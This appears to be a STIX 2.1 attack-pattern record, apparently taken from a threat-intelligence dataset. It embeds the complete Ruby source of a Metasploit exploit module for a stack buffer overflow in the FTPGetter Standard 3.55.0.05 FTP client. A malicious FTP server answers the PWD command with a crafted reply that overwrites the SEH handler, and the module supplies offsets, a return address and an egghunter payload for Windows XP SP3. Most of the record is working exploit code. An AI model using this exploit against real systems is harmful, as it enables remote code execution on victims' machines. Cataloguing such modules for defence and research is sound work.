{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c5c2b7b2-64b5-41be-817d-c5bfb06f1b44",
    "created": "2024-08-14T16:51:02.589119Z",
    "modified": "2024-08-14T16:51:02.589123Z",
    "name": "FTPGetter Standard v3.55.0.05 Stack Buffer Overflow (PWD)",
    "description": " This module exploits a buffer overflow in FTPGetter Standard v3.55.0.05 ftp client. When processing the response on a PWD command, a stack based buffer overflow occurs. This leads to arbitrary code execution when a structured exception handler gets overwritten. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/ftpgetter_pwd_reply.rb",
            "external_id": "ftpgetter_pwd_reply.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::FtpServer\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'FTPGetter Standard v3.55.0.05 Stack Buffer Overflow (PWD)',\n      'Description'    => %q{\n          This module exploits a buffer overflow in FTPGetter Standard v3.55.0.05 ftp client.\n        When processing the response on a PWD command, a stack based buffer overflow occurs.\n        This leads to arbitrary code execution when a structured exception handler gets\n        overwritten.\n      },\n      'Author' \t =>\n        [\n          'ekse',\t# found the bug\n          'corelanc0d3r <peter.ve[at]corelan.be>',\t#  wrote the exploit\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '68638'],\n          [ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\xff\\x0d\\x5c\\x2f\\x0a\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'XP SP3 Universal', { 'Offset' => 485, 'Ret' => 0x100139E5  } ],  # ppr [ssleay32.dll]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-10-12',\n      'DefaultTarget'  => 0))\n\n  end\n\n  def setup\n    super\n    badchars = \"\"\n    eggoptions =\n    {\n    :checksum => true,\n    :eggtag => \"W00T\"\n    }\n    @hunter,@egg = generate_egghunter(payload.encoded,badchars,eggoptions)\n  end\n\n  def on_client_unknown_command(c,cmd,arg)\n    c.put(\"200 OK\\r\\n\")\n  end\n\n  def on_client_command_pass(c,arg)\n    @state[c][:pass] = arg\n    c.put(\"230 OK #{@egg}\\r\\n\")\n    return\n  end\n\n  def on_client_command_pwd(c,arg)\n    junk1 = \"A\" * target['Offset']\n    junk2 = \"A\" * 9\n    nseh = \"\\x74\\x06\\x41\\x41\"\n    jmp = \"\\x75\\x08\"\n    seh = [target.ret].pack('V')\n    junk3 = \"D\" * 22000\n    #dual offset\n    buffer = junk1 + nseh + seh + junk2 + jmp + nseh + seh + @hunter + junk3\n    c.put(\"257 \\\"/\\\" #{buffer}\\r\\n\")\n    print_status(\"Sent payload, #{buffer.length} bytes\")\n    print_status(\"Wait for hunter ...\")\n    return\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-12",
    "x_mitre_platforms": [
        "win'"
    ]
}